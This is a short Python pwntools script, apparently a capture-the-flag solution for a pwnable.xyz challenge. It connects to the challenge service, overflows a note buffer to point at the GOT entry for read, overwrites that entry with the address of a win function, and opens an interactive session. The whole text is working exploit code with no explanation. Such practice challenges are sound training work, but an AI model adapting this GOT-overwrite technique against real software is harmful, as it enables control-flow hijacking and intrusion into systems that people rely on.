from pwn import *

p = remote("svc.pwnable.xyz", 30016)
e = ELF("./challenge")

read_got = e.got["read"]
win = e.symbols["win"]

payload = b"A" * 32 + p64(read_got)

p.sendlineafter("> ", "1")
p.sendlineafter("len? ", "45")
p.sendlineafter("note: ", payload)

p.sendlineafter(">", "2")
p.sendlineafter("desc:", p64(win))

p.interactive()